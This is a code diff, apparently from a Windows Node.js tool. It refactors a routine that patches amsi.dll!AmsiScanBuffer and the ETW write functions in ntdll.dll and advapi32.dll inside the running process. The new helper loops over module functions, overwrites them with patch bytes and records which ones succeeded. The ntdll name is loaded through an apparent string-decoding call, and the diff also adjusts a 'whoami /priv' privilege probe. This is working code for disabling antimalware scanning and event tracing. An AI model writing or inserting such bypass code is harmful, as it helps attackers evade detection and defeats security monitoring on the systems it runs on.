@@ -215,6 +215,52 @@ function patchFunction(targetAddr: bigint, patch: Buffer, name: string): boolean
  *
  * @returns true if at least one patch was successfully applied.
  */
+/** Result of a patch sweep over one module's function list. */
+interface ModulePatchResult {
+  applied: number;
+  errors: string[];
+}
+
+/**
+ * Patch every function in `funcs` inside `moduleName` with `patchBytes`.
+ * Records per-function status into patchStatus; collects failures.
+ */
+function patchModuleFunctions(
+  moduleName: string,
+  funcs: readonly string[],
+  patchBytes: Buffer,
+  statusPrefix = '',
+): ModulePatchResult {
+  const result: ModulePatchResult = { applied: 0, errors: [] };
+  const handle = getGMH()(moduleName);
+  if (handle === null || toBigInt(handle) === 0n) {
+    result.errors.push(`${moduleName}: GetModuleHandle returned null`);
+    for (const funcName of funcs) {
+      patchStatus.set(statusPrefix + funcName, false);
+    }
+    return result;
+  }
+
+  for (const funcName of funcs) {
+    const funcPtr = getGPA()(toBigInt(handle), funcName);
+    const funcAddr = toBigInt(funcPtr);
+    const statusKey = statusPrefix + funcName;
+    if (funcAddr !== 0n) {
+      if (patchFunction(funcAddr, patchBytes, statusKey)) {
+        result.applied++;
+        patchStatus.set(statusKey, true);
+      } else {
+        result.errors.push(`${statusKey}: patch write failed`);
+        patchStatus.set(statusKey, false);
+      }
+    } else {
+      result.errors.push(`${statusKey}: GetProcAddress returned null`);
+      patchStatus.set(statusKey, false);
+    }
+  }
+  return result;
+}
+
 export function applyInProcessPatches(): boolean {
   if (patchedState) return true;
   if (process.platform !== 'win32') {
@@ -227,77 +273,24 @@ export function applyInProcessPatches(): boolean {
 
   try {
     // Patch AMSI: amsi.dll!AmsiScanBuffer
-    const amsiHandle = getGMH()('amsi.dll');
-    if (amsiHandle !== null && toBigInt(amsiHandle) !== 0n) {
-      const amsiScanBuffer = getGPA()(toBigInt(amsiHandle), 'AmsiScanBuffer');
-      const amsiAddr = toBigInt(amsiScanBuffer);
-      if (amsiAddr !== 0n) {
-        if (patchFunction(amsiAddr, AMSI_PATCH, 'AmsiScanBuffer')) {
-          appliedCount++;
-          patchStatus.set('AmsiScanBuffer', true);
-        } else {
-          errors.push('AmsiScanBuffer: patch write failed');
-          patchStatus.set('AmsiScanBuffer', false);
-        }
-      } else {
-        errors.push('AmsiScanBuffer: GetProcAddress returned null');
-        patchStatus.set('AmsiScanBuffer', false);
-      }
-    } else {
-      errors.push('amsi.dll: GetModuleHandle returned null');
-      patchStatus.set('AmsiScanBuffer', false);
-    }
+    const amsi = patchModuleFunctions('amsi.dll', ['AmsiScanBuffer'], AMSI_PATCH);
+    appliedCount += amsi.applied;
+    errors.push(...amsi.errors);
 
     // Patch all ETW write functions in ntdll.dll
-    const ntdllHandle = getGMH()(ds(DLL.ntdll));
-    if (ntdllHandle !== null && toBigInt(ntdllHandle) !== 0n) {
-      for (const funcName of ETW_FUNCTIONS) {
-        const funcPtr = getGPA()(toBigInt(ntdllHandle), funcName);
-        const funcAddr = toBigInt(funcPtr);
-        if (funcAddr !== 0n) {
-          if (patchFunction(funcAddr, ETW_PATCH_SHORT, funcName)) {
-            appliedCount++;
-            patchStatus.set(funcName, true);
-          } else {
-            errors.push(`${funcName}: patch write failed`);
-            patchStatus.set(funcName, false);
-          }
-        } else {
-          errors.push(`${funcName}: GetProcAddress returned null`);
-          patchStatus.set(funcName, false);
-        }
-      }
-    } else {
-      errors.push('ntdll.dll: GetModuleHandle returned null');
-      for (const funcName of ETW_FUNCTIONS) {
-        patchStatus.set(funcName, false);
-      }
-    }
+    const etw = patchModuleFunctions(ds(DLL.ntdll), ETW_FUNCTIONS, ETW_PATCH_SHORT);
+    appliedCount += etw.applied;
+    errors.push(...etw.errors);
 
     // Patch advapi32!EventWrite (another ETW entry point)
-    const advapi32Handle = getGMH()('advapi32.dll');
-    if (advapi32Handle !== null && toBigInt(advapi32Handle) !== 0n) {
-      for (const funcName of ADVAPI32_FUNCTIONS) {
-        const funcPtr = getGPA()(toBigInt(advapi32Handle), funcName);
-        const funcAddr = toBigInt(funcPtr);
-        if (funcAddr !== 0n) {
-          if (patchFunction(funcAddr, ETW_PATCH_SHORT, `advapi32!${funcName}`)) {
-            appliedCount++;
-            patchStatus.set(`advapi32!${funcName}`, true);
-          } else {
-            errors.push(`advapi32!${funcName}: patch write failed`);
-            patchStatus.set(`advapi32!${funcName}`, false);
-          }
-        } else {
-          errors.push(`advapi32!${funcName}: GetProcAddress returned null`);
-          patchStatus.set(`advapi32!${funcName}`, false);
-        }
-      }
-    } else {
-      for (const funcName of ADVAPI32_FUNCTIONS) {
-        patchStatus.set(`advapi32!${funcName}`, false);
-      }
-    }
+    const advapi = patchModuleFunctions(
+      'advapi32.dll',
+      ADVAPI32_FUNCTIONS,
+      ETW_PATCH_SHORT,
+      'advapi32!',
+    );
+    appliedCount += advapi.applied;
+    errors.push(...advapi.errors);
   } catch (err) {
     errors.push(err instanceof Error ? err.message : String(err));
   }
@@ -318,7 +311,6 @@ export function applyInProcessPatches(): boolean {
   logger.debug(`InProcessPatcher: all patches failed — ${patchErrorState}`);
   return false;
 }
-
 /**
  * Check whether in-process patches are currently active.
  */
@@ -1060,7 +1052,12 @@ export function getEtwMonitoringSummary(): {
   if (process.platform === 'win32') {
     try {
       const { execSync } = require('node:child_process');
-      const whoami = execSync('whoami /priv', {
+      // Absolute path: on hosts with MSYS/Git-Bash on PATH, a bare `whoami`
+      // resolves to /usr/bin/whoami, which rejects the `/priv` flag ("extra
+      // operand") and the probe silently reads as non-admin. SystemRoot
+      // fallback mirrors SyscallResolver's ntdll resolution.
+      const systemRoot = process.env.SystemRoot || process.env.WINDIR || 'C:\\Windows';
+      const whoami = execSync(`"${systemRoot}\\System32\\whoami.exe" /priv`, {
         timeout: 5000,
         encoding: 'utf8',
         windowsHide: true,
